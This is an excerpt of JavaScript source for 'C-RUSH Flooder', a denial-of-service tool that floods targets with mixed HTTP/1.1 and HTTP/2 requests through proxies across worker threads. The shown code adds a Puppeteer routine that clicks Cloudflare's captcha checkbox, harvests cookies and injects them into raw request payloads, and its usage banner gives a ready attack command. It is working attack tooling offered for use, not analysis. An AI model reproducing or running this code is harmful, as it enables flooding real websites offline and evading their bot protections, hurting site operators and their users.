...
// Enhanced options parsing with new -cf flag
...
const options = {
    ...
    cloudflare: args.includes('-cf') // New flag for Cloudflare bypass using Puppeteer
};
...
if (process.argv.length < 7) {
    ...
    ${colors.green(`Ã°Å¸`)} C-RUSH Flooder - HTTP/1.1 & HTTP/2 Mixed RushAway
        ${colors.gray(`Made with Ã¢Â¤Ã¯Â¸ by NIKKI (${colors.red(`@`)}getflood)`)}
    ...
    - Cloudflare bypass with Puppeteer (-cf flag)`)}
    ...
    ${colors.gray(`-cf: Enable Cloudflare bypass using Puppeteer`)}

    ${colors.gray(`Example${colors.red(`:`)}`)}
    ${colors.gray(`node c-rush.js https://target.com 120 proxies.txt 100 64 -c -h -v 2 -j 0.3 -cf`)}
    `));
    process.exit(1);
}
...
try {
    ...
    if(options.debug) console.log(colors.red('Ã°Å¸Å¡Â« Error loading proxy file'));
    process.exit(1);
}
...
let stats = {
    ...
    forbidden: 0,
    errors: 0,
    captchaBypassed: 0 // New stat for tracking captcha bypasses
}
...
// New function to handle Cloudflare captcha bypass using Puppeteer
async function bypassCloudflare(targetUrl, proxyEntry) {
    ...
    try {
        ...
        await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: options.timeout });

        // Check for Cloudflare captcha
        const captchaCheckbox = await page.$('input[type="checkbox"]');
        if (captchaCheckbox) {
            if (options.debug) console.log(colors.green('Cloudflare captcha detected, attempting to bypass...'));

            // Click the captcha checkbox
            await captchaCheckbox.click();
            
            // Wait for navigation or success indicator
            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: options.timeout }).catch(() => {
                // Sometimes Cloudflare doesn't navigate, so we check for success
            });

            // Check if bypass was successful by looking for Cloudflare success message
            const successText = await page.evaluate(() => {
                return document.body.innerText.includes('Success!!');
            });

            if (successText) {
                stats.captchaBypassed++;
                if (options.debug) console.log(colors.green('Cloudflare captcha bypassed successfully!'));
            } else {
                if (options.debug) console.log(colors.yellow('Failed to bypass Cloudflare captcha.'));
                stats.errors++;
            }
        } else {
            if (options.debug) console.log(colors.yellow('No Cloudflare captcha detected.'));
        }
        ...
        if (options.debug) console.log(colors.red(`Puppeteer error: ${err.message}`));
        stats.errors++;
...
// Enhanced connection handler with Puppeteer for Cloudflare bypass
async function go() {
    ...
    if (options.cloudflare) {
        // Use Puppeteer to bypass Cloudflare captcha and get cookies
        cookieString = await bypassCloudflare(target, proxyEntry);
        if (!cookieString) {
            setTimeout(go, 100);
            return;
        }
            ...
            tlsSocket = tls.connect({
                ...
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1' || options.version === '1') {
                    function doWrite() {
                        ...
                        if (cookieString) {
                            payload = Buffer.from(payload.toString('binary').replace('\r\n\r\n', `\r\nCookie: ${cookieString}\r\n\r\n`), 'binary');
                        }
...
if (cluster.isMaster) {
    ...
    if(options.debug) {
        console.log(colors.red(`
 ${colors.green(`Ã°Å¸`)} C-RUSH - H1 & H2 Mixed RushAway Flooder
     ${colors.gray(`Made with Ã¢Â¤Ã¯Â¸ by NIKKI (${colors.red(`@`)}getflood)`)}
  ...
  ${colors.gray(`Cloudflare Bypass${colors.red(`:`)} ${options.cloudflare ? 'Enabled' : 'Disabled'}`)}
`));
    }
    ...
    for(let i = 0; i < threads; i++) {
        ...
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                ...
                stats.captchaBypassed += msg.captchaBypassed;
            }
        });
    }
    ...
    setInterval(() => {
        if(options.debug) {
            console.log(colors.gray(`Requests: ${stats.requests} | Success: ${stats.success} | Errors: ${stats.errors} | GoAway: ${stats.goaway} | Captcha Bypassed: ${stats.captchaBypassed}`));
        }
    }, 5000);
    ...
    setInterval(() => {
        process.send({
            ...
            errors: stats.errors,
            captchaBypassed: stats.captchaBypassed
        });
